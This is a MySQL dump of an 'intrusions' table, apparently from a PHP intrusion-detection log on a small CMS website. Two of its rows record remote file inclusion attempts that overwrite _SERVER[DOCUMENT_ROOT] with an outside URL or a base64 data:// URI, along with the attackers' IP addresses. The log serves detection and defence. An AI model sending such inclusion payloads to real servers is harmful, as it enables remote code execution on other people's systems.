# Host: localhost  (Version: 5.6.20)
# Date: 2015-01-28 15:28:43
# Generator: MySQL-Front 5.3  (Build 4.187)

/*!40101 SET NAMES latin1 */;

#
# Structure for table "intrusions"
#

DROP TABLE IF EXISTS `intrusions`;
CREATE TABLE `intrusions` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(128) NOT NULL DEFAULT '',
  `value` text NOT NULL,
  `page` varchar(255) NOT NULL DEFAULT '',
  `ip` varchar(15) NOT NULL DEFAULT '',
  `impact` int(11) unsigned NOT NULL DEFAULT '0',
  `created` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=5 DEFAULT CHARSET=latin1;

#
# Data for table "intrusions"
#

/*!40000 ALTER TABLE `intrusions` DISABLE KEYS */;
INSERT INTO `intrusions` VALUES (1,'judul','ibrahimovic-hamil-delapan-bulan-3-6-2','/auracms2.3/article-9-ibrahimovic-hamil-delapan-bulan-3-6-2.html','local/unknown',7,'2010-08-28 04:00:00'),(2,'_SERVER.DOCUMENT_ROOT','http://94.199.51.7/readme.txt?','/?_SERVER[DOCUMENT_ROOT]=http://94.199.51.7/readme.txt?','94.199.51.7',5,'2013-04-17 00:41:17'),(3,'_ult','sec=web&slk=web&pos=3&linkstr=http%3A%2F%2Fppikom.com%2Farticle-cara-mengkrimping-kabel-rj45-dan-urutan-warna-kabel-straight-amp-cross.html','/article-cara-mengkrimping-kabel-rj45-dan-urutan-warna-kabel-straight-amp-cross.html?_ult=sec%3Dweb%26slk%3Dweb%26pos%3D3%26linkstr%3Dhttp%253A%252F%252Fppikom.com%252Farticle-cara-mengkrimping-kabel-rj45-dan-urutan-warna-kabel-straight-amp-cross.html','50.57.206.196',15,'2013-06-20 15:11:19'),(4,'_SERVER.DOCUMENT_ROOT','data://text/plain;base64,U0hFTExfTU9KTk9fUFJPQk9WQVRK?','/?_SERVER[DOCUMENT_ROOT]=data://text/plain;base64,U0hFTExfTU9KTk9fUFJPQk9WQVRK?','79.135.239.234',10,'2013-09-09 06:15:10');
/*!40000 ALTER TABLE `intrusions` ENABLE KEYS */;
